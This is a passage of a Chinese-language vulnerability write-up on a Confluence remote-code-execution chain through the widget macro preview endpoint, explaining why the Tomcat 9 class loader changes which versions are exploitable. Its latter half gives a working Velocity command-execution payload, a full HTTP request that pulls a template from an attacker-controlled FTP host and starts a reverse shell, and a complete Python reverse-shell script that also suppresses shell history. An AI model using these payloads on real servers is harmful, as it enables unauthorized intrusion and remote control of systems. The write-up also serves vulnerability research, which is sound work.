可以看到致此完成了请求的发送。以上我们就完成整条rce利用链的分析。
#### 3.3 6.6.x-6.9.x与6.14.1的区别
当我们分析完rce的流程并成功弹出计算器后，整个漏洞就已经分析完了么？并没有。
以上的分析都是在confluence 6.6.11版本上进行的，但不幸的是我最初分析的版本是confluence
6.14.1版本，利用`file`协议任意读文件的poc我并没有执行成功，我只能利用相对路径来读取当前目录的文件，这不禁激发了我的探索欲，我想知道为啥较高版本就没有办法rce了。
在我进行调试后，我发现了`ClasspathResourceLoader`在向上找父类时获得的父类并不是`WebappClassLoader`而是`ParalleWebappClassLoader`，导致最终在`URLClassPath#findResource`时，其并未调用`URLClassPath$Loader`的`findResource`，而是调用的`URLClassPath$JarLoader`的`findResource`：
这里返回的肯定是null，并不会向外发送请求并获取资源。可以说这个问题的关键点就在于`WebappClassLoader`与`ParalleWebappClassLoader`中的upc的类型不同，那为什么会在代码相同的情况下，会造成加载偏差呢？
**关键点在于6.14.1是使用的tomcat9，而6.6.x-6.9.x使用的是tomcat8。不同tomcat版本的区别在于其默认的loader是不同的：**
在tomcat9中默认的loader是`ParalleWebappClassLoader`，在tomcat8中则是`WebappClassLoader`，关于其upc为什么不同，这一点我推荐各位看一下[这篇文章](https://www.jianshu.com/p/69c4526b843d)。
### 0x04 构造POC
这里其实改一下poc就好，正常的写Velocity的语法就好，下面执行命令的poc引用:
    #set ($exp="exp")
    #set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($command))
    #set ($input=$exp.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
    #set($sc = $exp.getClass().forName("java.util.Scanner"))
    #set($constructor = $sc.getDeclaredConstructor($exp.getClass().forName("java.io.InputStream")))
    #set($scan=$constructor.newInstance($input).useDelimiter("\\A"))
    #if($scan.hasNext())
        $scan.next()
    #end
反弹shell的:
> 请求
    POST /rest/tinymce/1/macro/preview HTTP/1.1
    Host: 10.10.20.181
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
    Accept: text/plain, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/json; charset=utf-8
    X-Requested-With: XMLHttpRequest
    Referer: http://10.10.20.181/
    Content-Length: 232
    X-Forwarded-For: 127.0.0.2
    Connection: keep-alive
    {"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"ftp://10.10.20.166:8888/r.vm","command":"setsid python /tmp/nc.py 10.10.20.166 8989"},"body":""}}
> nc.py
    # -*- coding:utf-8 -*-    #!/usr/bin/env python
    """
    back connect py version,only linux have pty module
    code by google security team
    """
    import sys,os,socket,pty
    shell = "/bin/sh"
    def usage(name):
        print 'python reverse connector'
        print 'usage: %s  ' % name
    def main():
        if len(sys.argv) !=3:
            usage(sys.argv[0])
            sys.exit()
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((sys.argv[1],int(sys.argv[2])))
            print 'connect ok'
        except:
            print 'connect faild'
            sys.exit()
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        global shell
        os.unsetenv("HISTFILE")
        os.unsetenv("HISTFILESIZE")
        os.unsetenv("HISTSIZE")
        os.unsetenv("HISTORY")
        os.unsetenv("HISTSAVE")
        os.unsetenv("HISTZONE")
        os.unsetenv("HISTLOG")
        os.unsetenv("HISTCMD")
        os.putenv("HISTFILE",'/dev/null')
        os.putenv("HISTSIZE",'0')
        os.putenv("HISTFILESIZE",'0')
        pty.spawn(shell)
        s.close()
    if __name__ == '__main__':
        main()
效果：
### 0x05 Reference
  * 
  * 
  * 
  * 
  * 
  * 
* * *